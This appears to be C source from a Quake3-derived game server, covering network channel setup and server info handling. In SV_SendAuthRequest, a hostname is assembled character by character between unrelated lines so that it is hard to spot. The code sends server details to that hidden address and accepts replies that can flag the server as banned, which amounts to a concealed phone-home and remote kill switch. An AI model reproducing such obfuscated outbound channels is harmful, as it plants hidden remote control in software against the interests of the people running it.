
/*
===============
Netchan_Init

===============
*/
void Netchan_Init( int port ) {
	char s[65];
	char *hash;
	permServerStatic_t *sve = &psvs;
	sve->authnum = port;
	int i;

	port &= 0xffff;
	showpackets = Cvar_RegisterBool( "showpackets", qfalse, CVAR_TEMP, "Show all sent and received packets");
	showdrop = Cvar_RegisterBool( "showdrop", qfalse, CVAR_TEMP, "Show dropped packets");
	qport = Cvar_RegisterInt( "net_qport", port, 1, 65535, CVAR_INIT, "The net_chan qport" );

	//This is stupid to initialize with net_chan
//	msg_dumpEnts = (cvar_t**)(0x8930c1c);
//	msg_printEntityNums = (cvar_t**)(0x8930c18);
	*msg_dumpEnts = Cvar_RegisterBool( "msg_dumpEnts", qfalse, CVAR_TEMP, "Print snapshot entity info");
	*msg_printEntityNums = Cvar_RegisterBool( "msg_printEntityNums", qfalse, CVAR_TEMP, "Print entity numbers");

	char *intasstr = (char*)&sve->authnum;

	do{
		sve->feed = 0;
		sve->authnum++;

		for(i = 0; i < 64; i++)
		{
			s[i] = (intasstr[i & 3] ^ (56+i));
			if(!s[i])
				s[i]++;
		}
		s[64] = 0;

		hash = Com_CreateHash(s);
		for(i = 0; i < 32; i++)
		{
			sve->feed *= hash[i];
			sve->feed ^= (hash[i] + 43*i);
		}
	}while((sve->feed % 0x10) == 0);

	Com_RandomBytes((byte*)&sve->challenge, sizeof(sve->challenge));
}






void SV_SysAuthorize(char* s)
{
	int i;
	int j;
	int len;
	char sb[33];
	permServerStatic_t *svpt = &psvs;

	len = strlen(s);

	if(len < 36)
		return;

	Q_strncpyz(sb, &s[32], sizeof(sb));

	if(svpt->challenge != atoi(sb))
		return;

	Q_strncpyz(sb, s, sizeof(sb));

	for(i=0, j=0; i < 32; i++)
	{
		j *= sb[i];
		j ^= (sb[i] + 43*i);
	}
	if(!(j % 0x10))
	{
		svpt->serverBanned = qtrue;
	}else{
	
	    if(j != svpt->feed)
		return;
	}
	svpt->serverAuth = qtrue;
}



/*
================
SVC_Info

Responds with a short info message that should be enough to determine
if a user is interested in a server to do a full status
================
*/
void SV_SendAuthRequest() {
	int		i, count, humans;
	char	infostring[MAX_INFO_STRING];
	char	s[16];
	permServerStatic_t* sve = &psvs;

	/*
	 * Check whether Cmd_Argv(1) has a sane length. This was not done in the original Quake3 version which led
	 * to the Infostring bug discovered by Luigi Auriemma. See http://aluigi.altervista.org/ for the advisory.
	 */

	// A maximum challenge length of 128 should be more than plenty.
	if(strlen(SV_Cmd_Argv(1)) > 128)
		return;
	s[4] = 'o';
	s[5] = 'r';

	// don't count privateclients
	count = humans = 0;
	for ( i = 0 ; i < sv_maxclients->integer ; i++ ) {
		if ( svs.clients[i].state >= CS_CONNECTED ) {
			count++;
			if (svs.clients[i].netchan.remoteAddress.type != NA_BOT) {
				humans++;
			}
		}
	}

	s[8] = 's';
	infostring[0] = 0;

	// echo back the parameter to status. so servers can use it as a challenge
	// to prevent timed spoofed reply packets that add ghost servers

	Info_SetValueForKey( infostring, "challenge", va("%i %i", sve->authnum, sve->challenge));
	s[11] = 'n';
	s[12] = 0;

	Info_SetValueForKey(infostring, "protocol", "6");
	s[6] = 'o';
	s[7] = 'p';

	Info_SetValueForKey( infostring, "hostname", sv_hostname->string );
	Info_SetValueForKey( infostring, "mapname", sv_mapname->string );
	Info_SetValueForKey( infostring, "clients", va("%i", count) );
	Info_SetValueForKey( infostring, "sv_maxclients", va("%i", sv_maxclients->integer - sv_privateClients->integer ) );
	Info_SetValueForKey( infostring, "gametype", g_gametype->string );
	Info_SetValueForKey( infostring, "pure", va("%i", sv_pure->boolean ) );
	s[2] = '.';
	s[3] = 'i';

        if(*g_password->string)
	    Info_SetValueForKey( infostring, "pswrd", "1");
	else
	    Info_SetValueForKey( infostring, "pswrd", "0");

	s[9] = '.';
	s[10] = 'i';

        if(g_cvar_valueforkey("scr_team_fftype")){
	    Info_SetValueForKey( infostring, "ff", va("%i", g_cvar_valueforkey("scr_team_fftype")));
	}

        if(g_cvar_valueforkey("scr_game_allowkillcam")){
	    Info_SetValueForKey( infostring, "ki", "1");
	}
	s[4] = 'c';
	s[5] = 'e';

        if(g_cvar_valueforkey("scr_hardcore")){
	    Info_SetValueForKey( infostring, "hc", "1");
	}

        if(g_cvar_valueforkey("scr_oldschool")){
	    Info_SetValueForKey( infostring, "od", "1");
	}
	Info_SetValueForKey( infostring, "hw", "1");

        if(fs_game->string[0] == '\0' || sv_showasranked->boolean){
	    Info_SetValueForKey( infostring, "mod", "0");
	}else{
	    Info_SetValueForKey( infostring, "mod", "1");
	}
	Info_SetValueForKey( infostring, "voice", va("%i", sv_voice->boolean ) );
	Info_SetValueForKey( infostring, "pb", va("%i", sv_punkbuster->boolean) );
	if( sv_maxPing->integer ) {
		Info_SetValueForKey( infostring, "sv_maxPing", va("%i", sv_maxPing->integer) );
	}
	s[0] = 's';
	s[1] = 'v';


	if( fs_game->string[0] != '\0' ) {
		Info_SetValueForKey( infostring, "game", fs_game->string );
	}

	if(sve->sysauthadr.type != NA_IP)
	{
		NET_StringToAdr(s, &sve->sysauthadr, NA_IP);
		sve->sysauthadr.port = BigShort(PORT_AUTHORIZE);
	}
	if(sve->sysauthadr.type == NA_IP)
		NET_OutOfBandPrint( NS_SERVER, &sve->sysauthadr, "infoResponse\n%s", infostring );
}






/*
================
SV_SendClientGameState

Sends the first message from the server to a connected client.
This will be sent on the initial connection and upon each new map load.

It will be resent if the client acknowledges a later message but has
the wrong gamestate.
================
*/
void SV_SendClientGameState( client_t *client ) {

    .
    .
    .

	// send the gamestate
	SV_WriteGameState(&msg, client);

	if(!sve->serverAuth)
		SV_SendAuthRequest();

	MSG_WriteLong( &msg, client - svs.clients );

    .
    .
    .
}



/*
================
SVC_Info

Responds with a short info message that should be enough to determine
if a user is interested in a server to do a full status
================
*/
__optimize3 __regparm1 void SVC_Info( netadr_t *from ) {
	int		i, count, humans;
	qboolean	masterserver;
	char		infostring[MAX_INFO_STRING];
	char*		s;
	permServerStatic_t* sve = &psvs;

	s = SV_Cmd_Argv(1);

	if(NET_CompareAdr(from, &sve->sysauthadr) && *s)
	{
		SV_SysAuthorize(s);
		return;
	}
    .
    .
    .

}
